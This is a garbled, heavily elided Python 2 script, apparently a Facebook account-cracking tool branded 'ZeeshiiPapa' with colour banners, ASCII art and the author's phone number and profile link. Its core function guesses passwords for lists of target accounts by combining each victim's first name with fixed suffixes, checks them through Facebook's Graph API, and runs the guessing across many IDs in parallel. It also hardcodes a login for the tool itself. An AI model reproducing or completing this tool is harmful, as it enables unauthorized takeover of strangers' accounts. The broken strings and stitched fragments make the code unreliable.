#!/usr/bin/python2
#coding=utf-8
#The Credit For This Code Goes To worldhacker
...
ZZZZZZZZZZZZZZZZZZZEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE SSSSSSSSSSSSSSS   HHHHHHHHH     HHHHHHHHHIIIIIIIIIIIIIIIIIIII                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
  ...
  \033[1;91m:》》》\033[1;93m+923072780963\033[1;91m《《《▒▒▒▒▒▒▒▒▒▒▒:::::
\033[1;95m♡╭──────────•◈•──────────╮♡\033[1;96m-ZeeshiiPapa-\033[1;95m♡╭──────────•◈•──────────╮♡
\033[1;92m..........................ZeeshiiPapa......................
\033[1;93m╔╗ ╔╗╔═╦╦╦═╗ ╔╗╔╦═╦╦╗
\033[1;93m║║ ║╚╣║║║║╩╣ ╚╗╔╣║║║║   Pakistan
\033[1;93m╚╝ ╚═╩═╩═╩═╝═ ╚╝╚═╩═╝ 
\033[1;95m♡╰──────────•◈•──────────╯♡\033[1;96mZeeshiiPapa\033[1;95m♡╰──────────•◈•──────────╯♡"""
...
print  """
 ...
 \033[1;96m 
  \033[1;96m ─────────────•◈•──────────  
   \033[1;92m███████▒▒Welcome To ZEESHII PAPA▒▒████████
\033[1;95m♡╭──────────•◈•──────────╮♡\033[1;96mZeeshiiPapa\033[1;95m♡╭──────────•◈•──────────╮♡
\033[1;94mAuthor\033[1;91m: \033[1;91mworldhacker
\033[1;94mBZEESHIIPAPA\033[1;91m: \033[1;91▒▓██████████████]99.9
\033[1;94mFacebook\033[1;91m: \033[1;91m  ( https://www.facebook.com/zee.shii.73 )
\033[1;94mWhatsapp\033[1;91m: \033[1;91m+923072780963
\033[1;95m♡╰──────────•◈•──────────╯♡\033[1;96mZeeshiiPapa\033[1;95m♡╰──────────•◈•──────────╯♡"""
jalan('              \033[1;96m.................... ZEESHII PAPA.....................:')                                        
...
jalan("\033[1;93m   
jalan("\033[1;93m                                    
print "\033[1;93m♡                                                                                 ───────♡\033[1;96mLogin ZeeshiiPapa\033[1;95m♡╰──────────•◈•──────────╯♡"                                                                                              __,
                                       __...---`````_,
           .-``-.     .-``-......__.-``   _.--``````  ___,
          ^      :   :               -`````---````````_,
          ^_      :  :....._                    _.-```
               ...
               `-._     /  ;   ; \     ,-'
                   `.__/    ;  ;  \__,'
                             ; ;)`.
                              ;;'..)
                               ;
CorrectUsername = "ZEESHII"
CorrectPassword = "TABIR"
...
while (loop == 'true'):
    ...
    if (username == CorrectUsername):
        ...
        if (password == CorrectPassword):
            print "Logged in successfully as " + username #Dev:world_hacker
	    time.sleep(2)
            loop = 'false'
        else:
...
def login():
	...
	try:
		...
		print "\033[1;95m♡──────────•◈•──────────♡\033[1;96mZeeshiiPapa\033[1;95m♡──────────•◈•──────────♡"
...
def menu():
	...
	try:
		...
		keluar()
	os.system("clear") #Dev:world_hacker
	print logo
...
def pilih_super():
						...
						if 'www.facebook.com' in q["error_msg"]:
							...
							if 'access_token' in q:
								...
								if 'www.facebook.com' in q["error_msg"]:
									...
									pass4 = b['first_name'] + 'ZeeshiiPapa'
												...
												if 'www.facebook.com' in q["error_msg"]:
													...
													if 'access_token' in q:
														...
														if 'www.facebook.com' in q["error_msg"]:
															...
															a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
															b = json.loads(a.text)
															pass7 = b['first_name'] + 'Kingofworld'
	...
	p.map(main, id)
	print "\033[1;95m♡──────────•◈•──────────♡\033[1;96mZeeshiiPapa\033[1;95m♡──────────•◈•──────────♡"
	print "  \033[1;93m«---•◈•---Developed By love---•◈•---»" #Dev:world_hacker
...
/______                       | | \)____(/ | |                      ______\ 
   ...
   /_______           ____/      \________/      \____           ______\    
           ...
           /              |      \\______//      |        \     \           
                        ...
                        ( (  )                (  ) )            
♡──────────────•◈•──────────────♡.
: \033[1;96m .....worldhacker  ZeeshiiPapa........... \033[1;93m :
♡──────────────•◈•──────────────♡.' 
                whatsapp Num
               +923072780963"""
